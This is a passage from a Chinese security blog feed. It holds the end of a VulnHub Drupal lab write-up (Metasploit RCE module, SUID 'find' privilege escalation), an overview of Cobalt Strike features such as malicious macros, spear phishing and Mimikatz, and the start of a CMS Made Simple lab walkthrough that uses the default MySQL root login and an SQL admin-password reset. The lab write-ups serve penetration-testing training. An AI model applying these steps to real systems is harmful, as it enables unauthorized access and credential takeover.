exp</h2><p>我看了网上很多WP，直接一来就上msf搜，然后就说直接用2018年那个exp，也不说明为什么那个可以用（除了有一个说了：从最新日期的exp一个个试出来的，其他的都写的水的一批），你根本不知道他为什么要用那个exp，好像他在打靶机的时候，拿着别人的wp，开启上帝视角，开局就知道用哪个，没有任何判断。当然不排除写wp的人知道怎么判断的，但wp没有写出来，这种平铺直述的wp，你可以照做，但如果你不加任何思考的照做了，这对你个人的渗透思维的建立是极大的阻碍。</p><p>这里我给到我的思路和判断</p><ul><li>先用searchsploit搜索</li></ul><p>searchspliot不是msf的一个模块，他是独立的，不需要进入msf环境，直接在bash里执行就好。</p><p>用searchsploit去搜索漏洞，本质上和你去<code>ExploitDB</code>这种网站搜索是一样的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit drupal 7</span><br></pre></td></tr></table></figure><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670468123121-d5ce0de3-f240-4720-aafa-6bbf66d2919f.png" alt="img"></p><p>搜出来还挺多的，还有不少的RCE，有些后面标注了Metasploit，应该是在msf里有</p><p>那我们用管道符过滤一下msf里面有的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit drupal 7 | grep Metasploit</span><br></pre></td></tr></table></figure><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670469158070-783e4fc7-d7ba-424b-b39b-9813f771b514.png" alt="img"></p><p>那我们再用msf验证一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入msf</span></span><br><span class="line">msfconsole</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搜索drupal，这里就最好不要带上个7了，因为msf没有写那么详细</span></span><br><span class="line">search drupal</span><br></pre></td></tr></table></figure><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670469081761-9ac3a683-c194-4c64-ae0e-36d376186b80.png" alt="img"></p><p>基本和上面的差不多</p><h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p>我首先用了第五个，因为他的日期最近，也在searchsploit里面出现过，但是利用失败了</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670667292138-19c692d4-7c14-465f-bb47-5bbb53d040a5.png" alt="img"></p><p>然后我换到第1个（msf搜索的序号为1，实际上是上面的第二个），设置一波参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br><span class="line"></span><br><span class="line">set rhosts 192.168.56.104</span><br><span class="line">set lhost 192.168.56.101</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">其他的默认就好</span></span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670667579179-c82d1886-76e9-46f9-a5f8-39027a626719.png" alt="img"></p><p>成功拿下shell</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>我个人喜欢先看suid提权，因为简单啊。内核提权还要去找脚本下脚本。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">寻找有suid权限的命令</span></span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>然后看到<code>find</code>有suid权限，find提权，这不直接就拿下了吗？</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670669696014-0639e8ba-8943-4542-a5a1-2f542b5f9cb9.png" alt="img"></p><h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p>找<code>/root</code>目录下的flag文档</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">cat thefinalflag.txt</span><br></pre></td></tr></table></figure><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670669793459-f8e8f751-52d5-4329-8693-c7bbdaf853e0.png" alt="img"></p><p>完结撒花~</p><h1 id="总结提升"><a href="#总结提升" class="headerlink" title="总结提升"></a>总结提升</h1><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>扫描c段拿到IP，扫面端口看开设的服务</p><p>发现80端口使用的是开源CMS-Drupal，找nday</p><p>存在RCE的nday，直接拿到shell</p><p>通过suid的find提权，拿到root权限，最终拿到flag</p><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>看了下其他博客的思路，记录下不同点</p><ul><li>在拿shell的时候，有的师傅是根据sql注入写入管理员账号的nday打下来的，本质都差不多，我这个更加简单些</li><li>才知道一共有5个flag，正打算去找其他flag的时候，去靶机下载的地方看了下作者的描述</li></ul><blockquote><p>There are five flags in total, but the ultimate goal is to find and read the flag in root’s home directory. You don’t even need to be root to do this, however, you will require root privileges.</p><p>Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.</p></blockquote><p>意思是：一共有5个flag，直接找最终的flag也是可以的</p><p>所以我就没再去找剩下四个flag</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike 4 介绍</title>
      <link href="/2022/cobalt-strike-4-introduction/"/>
      <url>/2022/cobalt-strike-4-introduction/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>cobalt strike(简称CS）是一款团队作战渗透测试神器，分为客户端及服务端，一个服务端可以对应多个客户端，一个客户端可以连接多个服务端。</p><p>Cobalt Strike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。</p><h1 id="CS与MSF"><a href="#CS与MSF" class="headerlink" title="CS与MSF"></a>CS与MSF</h1><p>metasploit是一款开源框架，armitage是metasploit框架的图形化界面方式, cobalt strike是armitage的增强版，同时也是收费软件。cobalt strike在2.0版本还是依托metasploit，在3.0之后的版本使用单独的平台。</p><h1 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h1><p>agscript：拓展应用的脚本</p><p>c2lint：用于检查profile的错误异常</p><p>teamserver：服务端程序</p><p>cobaltstrike,cobaltstrike.jar：客户端程序(java跨平台)</p><p>logs：目录记录与自标主机的相关信息</p><p>update,update.jar：用于更新CS</p><p>third-party：第三方工具</p><h1 id="安装使用"><a href="#安装使用" class="headerlink" title="安装使用"></a>安装使用</h1><p>1、下载安装包</p><p>2、将整个包移到服务器（teamserver只能在Linux上运行）</p><p>3、给<code>teamserver</code>+x（可执行权限）</p><p>4、启动服务器（修改默认端口vim teamserver –&gt; 最后，可以改端口）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver &lt;host ip&gt; &lt;passwd&gt;</span><br></pre></td></tr></table></figure><p>5、客户端打开bat或sh</p><h1 id="功能点"><a href="#功能点" class="headerlink" title="功能点"></a>功能点</h1><h2 id="Atacks"><a href="#Atacks" class="headerlink" title="Atacks"></a>Atacks</h2><ul><li><p>Packages</p></li><li><ul><li>HTML Application：生成.hta HTML应用程序</li><li>MS Office Macro：生成恶意宏放入office文件</li><li>Payload Generator：生成各种语言版本的payload</li><li>Windows Executable：可执行文件默认x86勾选x64表示包含x64</li><li>Windows Executable(S)：stageless生成全功能被控端</li></ul></li><li><p>Web Drive-By</p></li><li><ul><li>Manage：管理当前Team Server开启的所有web服务Clone Site克隆某网站</li><li>Host File：在Team Server的某端口提供Web以供下载某文件</li><li>Scripted Web Delivery：为payload提供web服务以便于下载和执行</li><li>Signed Applet Attack：启动一个Web服务以提供自签名Java Applet的运行环境</li><li>Smart Applet Attack：自动检测Java版本并利用已知的exploits绕过security sandbox</li><li>System Profiler：用来获取系统信息:系统版本，Flash版本，浏览器版本等</li></ul></li><li><p>Spear Phish：鱼叉钓鱼邮件功能</p></li></ul><h2 id="右键"><a href="#右键" class="headerlink" title="右键"></a>右键</h2><ul><li><p>Interact：交互</p></li><li><p>Access</p></li><li><ul><li>Dump Hashes</li><li>Elevate：提权</li><li>Golden Ticket</li><li>Make Token</li><li>One-liner</li><li>Run Mimikatz</li><li>Spawn As</li></ul></li><li><p>Explore</p></li><li><ul><li>Browser Povot</li><li>Desktop(VNC)</li></ul></li></ul><p>一般很卡，带宽不够</p><ul><li><ul><li>File Browser</li><li>Net View</li><li>Port Scan</li><li>Process List</li><li>Screenshot</li></ul></li><li><p>Pivoting</p></li><li><p>Spawn</p></li><li><p>Session</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【vulnhub】My cmsms攻略</title>
      <link href="/2022/my-cmsms-walkthrough/"/>
      <url>/2022/my-cmsms-walkthrough/</url>
      
        <content type="html"><![CDATA[<p>最近在打vulhub靶场，群里和大佬交流的时候，他告诉我一个Up主，然后我就去看了那个up的视频，跟着他打一些靶场，总比自己随随便便选一个要好。</p><p>写wp的初衷是记录自己的不足，也便于自己打完之后总结梳理整体思路，所以我的wp可能废话比较多。有些思路走到后面发现是错的，我也会写出来，不会因此删去那些想法。我觉得在你看到我的wp的时候，看到我的一些错误的思路，我踩过的坑，哪怕他在这个靶机上行不通，但它确实是一个思路。还有我看别人wp知道的新思路，新工具，我也都会记录在我的wp里</p><p>网上有大量平铺直述的wp，你打靶机，是为了扩展思路，还是简单的跟着wp做个复现，这个要搞清楚。</p><p>废话不多说了，开始吧！</p><h1 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h1><p>老样子，下载资源 <a href="https://vulnhub.com/entry/my-cmsms-1,498/">在这</a> ，自己下载好导入虚拟机即可</p><p><strong>参考链接</strong></p><p><a href="https://blog.csdn.net/hesysd/article/details/127753704">My-cmsms 靶机_匿名用户2的博客-CSDN博客</a></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h2><p>这次的靶机，一打开，就显示了IP，直接拿到IP，不需要扫描啥的了</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1669900651601-5c8f0828-2ec0-42a2-8bc2-7933a477add0.png" alt="img"></p><p><strong>靶机：192.168.56.102Kali：192.168.56.101</strong></p><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><p>拿到IP之后，我们要看一下，这个IP开放了哪些服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nmap -sTVC 192.168.56.102</span></span><br><span class="line"></span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 27:21:9e:b5:39:63:e9:1f:2c:b2:6b:d3:3a:5f:31:7b (RSA)</span><br><span class="line">|   256 bf:90:8a:a5:d7:e5:de:89:e6:1a:36:a1:93:40:18:57 (ECDSA)</span><br><span class="line">|_  256 95:1f:32:95:78:08:50:45:cd:8c:7c:71:4a:d4:6c:1c (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Home - My CMS</span><br><span class="line">|_http-generator: CMS Made Simple - Copyright (C) 2004-2020. All rights reserved.</span><br><span class="line">3306/tcp open  mysql   MySQL 8.0.19</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 8.0.19</span><br><span class="line">|   Thread ID: 13</span><br><span class="line">|   Capabilities flags: 65535</span><br><span class="line">|   Some Capabilities: LongPassword, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, ODBCClient, FoundRows, Support41Auth, SupportsTransactions, SwitchToSSLAfterHandshake, InteractiveClient, SupportsCompression, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, Speaks41ProtocolOld, ConnectWithDatabase, LongColumnFlag, SupportsLoadDataLocal, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt: n\x11!L.d%0v%K=rX\x0FNJta2</span><br><span class="line">|_  Auth Plugin Name: mysql_native_password</span><br><span class="line">| ssl-cert: Subject: commonName=MySQL_Server_8.0.19_Auto_Generated_Server_Certificate</span><br><span class="line">| Not valid before: 2020-03-25T09:30:14</span><br><span class="line">|_Not valid after:  2030-03-23T09:30:14</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>可以看到开了三个端口，22-SSH，80-HTTP，3306-MySQL</p><p>有搞头的也就是80和3306，一个对外开放了web服务，一个是数据库</p><h3 id="80"><a href="#80" class="headerlink" title="80"></a>80</h3><p>看以看到这里的web服务是一套CMS，我在看别人WP的时候，看到Kali内置了一个工具可以识别CMS，我之前没用过，码住了！这个工具是 <code>whatweb</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">whatweb http://192.168.56.102</span>      </span><br><span class="line"></span><br><span class="line">http://192.168.56.102 [200 OK] Apache[2.4.38], </span><br><span class="line">CMS-Made-Simple[2.2.13], Cookies[CMSSESSID2a2f83428536], </span><br><span class="line">Country[RESERVED][ZZ], HTML5, </span><br><span class="line">HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], </span><br><span class="line">IP[192.168.56.102], JQuery[1.11.1], </span><br><span class="line">MetaGenerator[CMS Made Simple - Copyright (C) 2004-2020. All rights reserved.], </span><br><span class="line">Script[text/javascript], Title[Home - My CMS]</span><br></pre></td></tr></table></figure><p>可以看到，扫出来的东西还是可以的，扫到了CMS的具体版本（虽然这在web页面也可以看到，但有时候难免会有遗漏的，这个挺方便），我之前都是用物理机的浏览器插件。</p><p>拿到一个CMS的时候，首先想到的是，NDay！于是我上网搜索了cmsms的漏洞</p><p>看到两个RCE，不过都不适用于这个版本，放弃</p><p>然后我又<strong>目录扫描</strong>了一波</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.56.102/</span><br><span class="line"></span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/admin/                                                                                                               </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/assets/                                                                                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/doc/                                                                                                                </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/lib/                                                                                                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/modules/                                                                                                             </span><br><span class="line">+ http://192.168.56.102/phpinfo.php (CODE:200|SIZE:90278)                                                                                                 </span><br><span class="line">+ http://192.168.56.102/phpmyadmin (CODE:401|SIZE:461)                                                                                                    </span><br><span class="line">+ http://192.168.56.102/server-status (CODE:403|SIZE:279)                                                                                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/tmp/                                                                                                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/uploads/                                                                                                             </span><br><span class="line">                                                                                                                                                          </span><br><span class="line">---- Entering directory: http://192.168.56.102/admin/ ----</span><br><span class="line">+ http://192.168.56.102/admin/index.php (CODE:302|SIZE:0)                                                                                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/admin/lang/                                                                                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/admin/plugins/                                                                                                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/admin/templates/                                                                                                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/admin/themes/                                                                                                        </span><br><span class="line">                                                                                                                                                          </span><br><span class="line">---- Entering directory: http://192.168.56.102/doc/ ----</span><br><span class="line">+ http://192.168.56.102/doc/index.html (CODE:200|SIZE:24)                                                                                                 </span><br><span class="line">+ http://192.168.56.102/doc/robots.txt (CODE:200|SIZE:121)                                                                                                </span><br><span class="line">                                                                                                                                                          </span><br><span class="line">---- Entering directory: http://192.168.56.102/lib/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/lib/assets/                                                                                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/lib/classes/                                                                                                         </span><br><span class="line">+ http://192.168.56.102/lib/index.html (CODE:200|SIZE:24)                                                                                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/lib/jquery/                                                                                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/lib/lang/                                                                                                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/lib/phpmailer/                                                                                                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/lib/plugins/                                                                                                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/lib/smarty/                                                                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/lib/tasks/                                                                             </span><br></pre></td></tr></table></figure><p>没啥进展</p><h3 id="3306"><a href="#3306" class="headerlink" title="3306"></a>3306</h3><p>之前打的靶机都是只开放了22和80端口，这台机子开了3306，一看就是MySQL服务，我们直接用默认账号密码连一下，发现连接成功了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h http://192.168.56.102/ -u root -p</span><br></pre></td></tr></table></figure><p>然后输入密码：root，发现成功进入</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670218233582-bc124b33-b628-40e4-a11f-3fb74be9d650.png" alt="img"></p><blockquote><p>这里我实在是太傻了，一直不知道那个箭头是干啥的，因为我在我的Windows上用mysql几乎都是用的Navicat图形化操作的，只有在学校刚学mysql那阵子用过命令行。</p><p>用过Navicat的应该知道，不打分号也是可以执行的，所以我在这里迷糊了好一阵，才想起用<code>;</code>去结束一句sql</p></blockquote><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><p>先看看有哪些数据库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| cmsms_db           |</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p>看这个命名，就大概知道，<code>cmsms_db</code>是80端口的站点数据库，后面几个都是mysql自带的。</p><p>进入<code>cmsms_db</code>看看有啥表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">use cmsms_db;</span><br><span class="line">show tables;</span><br><span class="line"></span><br><span class="line">+--------------------------------+</span><br><span class="line">| Tables_in_cmsms_db             |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| cms_additional_users           |</span><br><span class="line">| cms_additional_users_seq       |</span><br><span class="line">| cms_admin_bookmarks            |</span><br><span class="line">| cms_admin_bookmarks_seq        |</span><br><span class="line">| cms_adminlog                   |</span><br><span class="line">| cms_content                    |</span><br><span class="line">| cms_content_props              |</span><br><span class="line">| cms_content_props_seq          |</span><br><span class="line">| cms_content_seq                |</span><br><span class="line">| cms_event_handler_seq          |</span><br><span class="line">| cms_event_handlers             |</span><br><span class="line">| cms_events                     |</span><br><span class="line">| cms_events_seq                 |</span><br><span class="line">| cms_group_perms                |</span><br><span class="line">| cms_group_perms_seq            |</span><br><span class="line">| cms_groups                     |</span><br><span class="line">| cms_groups_seq                 |</span><br><span class="line">| cms_layout_design_cssassoc     |</span><br><span class="line">| cms_layout_design_tplassoc     |</span><br><span class="line">| cms_layout_designs             |</span><br><span class="line">| cms_layout_stylesheets         |</span><br><span class="line">| cms_layout_templates           |</span><br><span class="line">| cms_layout_tpl_addusers        |</span><br><span class="line">| cms_layout_tpl_categories      |</span><br><span class="line">| cms_layout_tpl_type            |</span><br><span class="line">| cms_locks                      |</span><br><span class="line">| cms_mod_cmsjobmgr              |</span><br><span class="line">| cms_mod_filepicker_profiles    |</span><br><span class="line">| cms_module_deps                |</span><br><span class="line">| cms_module_news                |</span><br><span class="line">| cms_module_news_categories     |</span><br><span class="line">| cms_module_news_categories_seq |</span><br><span class="line">| cms_module_news_fielddefs      |</span><br><span class="line">| cms_module_news_fieldvals      |</span><br><span class="line">| cms_module_news_seq            |</span><br><span class="line">| cms_module_search_index        |</span><br><span class="line">| cms_module_search_items        |</span><br><span class="line">| cms_module_search_items_seq    |</span><br><span class="line">| cms_module_search_words        |</span><br><span class="line">| cms_module_smarty_plugins      |</span><br><span class="line">| cms_module_templates           |</span><br><span class="line">| cms_modules                    |</span><br><span class="line">| cms_permissions                |</span><br><span class="line">| cms_permissions_seq            |</span><br><span class="line">| cms_routes                     |</span><br><span class="line">| cms_siteprefs                  |</span><br><span class="line">| cms_user_groups                |</span><br><span class="line">| cms_userplugins                |</span><br><span class="line">| cms_userplugins_seq            |</span><br><span class="line">| cms_userprefs                  |</span><br><span class="line">| cms_users                      |</span><br><span class="line">| cms_users_seq                  |</span><br><span class="line">| cms_version                    |</span><br><span class="line">+--------------------------------+</span><br></pre></td></tr></table></figure><p>对 <code>cms_users</code> 产生兴趣，猜测里面存储的是站点的用户信息，拿到之后，可以直接登录站点。</p><p>看看这个表里都有啥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select * from cms_users;</span><br><span class="line"></span><br><span class="line">+---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+                                                                  </span><br><span class="line">| user_id | username | password                         | admin_access | first_name | last_name | email             | active | create_date         | modified_date       |                                                                  </span><br><span class="line">+---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+                                                                  </span><br><span class="line">|       1 | admin    | fb67c6d24e756229aab021cea7605fb3 |            1 |            |           | admin@mycms.local |      1 | 2020-03-25 09:38:46 | 2020-03-26 10:49:17 |                                                                  </span><br><span class="line">+---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+ </span><br></pre></td></tr></table></figure><p>看以看到，只有一个用户admin，账号密码都出来了</p><p>密码盲猜md5加密，于是拿去解密了一波，没解出来</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670220854003-18830cbf-a575-48e8-b3e0-66eee9a3a474.png" alt="img"></p><h2 id="加密类型"><a href="#加密类型" class="headerlink" title="加密类型"></a>加密类型</h2><p>现在问题来了，有两条路：</p><ol><li>解出这个密码，直接登录</li><li>改密码，再登录</li></ol><p>不管是哪一种，最终都是要知道这个密码的加密方式才行</p><p>这里给出两种方式</p><h3 id="CMS文档"><a href="#CMS文档" class="headerlink" title="CMS文档"></a>CMS文档</h3><p>直接上网搜，因为这是个CMS，可能会有他们的帮助文档（或者其他人遇到过这个问题，解决了之后写博客发到网上），看能不能找到突破</p><blockquote><p> <strong>小提示：</strong></p><p><strong>如果是国人开发的CMS，首选用中文搜索；外国人开发的CMS首选英文搜索</strong></p><p>这很重要！！！因为我最开始用中文根本没搜到</p></blockquote><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670221468587-2f29b360-d9cd-409d-8569-dbff382fcc4a.png" alt="img" style="zoom:50%;" /><p>这里给出链接</p><p><a href="https://cmscanbesimple.org/blog/cms-made-simple-admin-password-recovery">CMS Made Simple Admin password recovery : : CMS Made Simple - Tutorials, Tips and Tricks - CMSMS</a></p><p>里面给出了三种重置密码的方法，这里我们主要关注数据库这条</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670221574024-3d8ce9dc-0e88-4b7f-9663-4e5ad299ed12.png" alt="img"></p><p>照着这个教程把密码改成<code>123456</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = &#x27;sitemask&#x27;),&#x27;&#x27;),&#x27;123456&#x27;))) where username = &#x27;admin&#x27;;</span><br></pre></td></tr></table></figure><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>这里给出另一种思路：代码审计</p><p>因为这是个开源的CMS，源码我们是可以下载到的，我们就可以直接下载下来，去看源码，找出密码的加密方式。</p><p>我个人代码审计比较菜，没有用这种方法。其实难度不高，B站有大佬的讲解视频用的就是这种方法，感兴趣可以去看看，id叫大福。</p><h1 id="Web后台"><a href="#Web后台" class="headerlink" title="Web后台"></a>Web后台</h1><p>之前目录扫描扫出来的<code>admin/</code>，进去之后，直接跳转到<code>admin/login.php</code>，在这里输入账号密码登录</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670222025602-29b137d7-af7f-4c13-bde2-190eb36d67bb.png" alt="img"></p><p>看以看到，成功登录后台了</p><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="用户自定义标签"><a href="#用户自定义标签" class="headerlink" title="用户自定义标签"></a>用户自定义标签</h2><p>发现左边标签栏有个<code>Extensions</code>，这引起了我的注意，因为之前在打一个靶机的时候，拿到WordPress的一个后台，最后也是通过扩展</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670222978330-ddff5efd-0597-487a-90bd-8ee2b07e36f9.png" 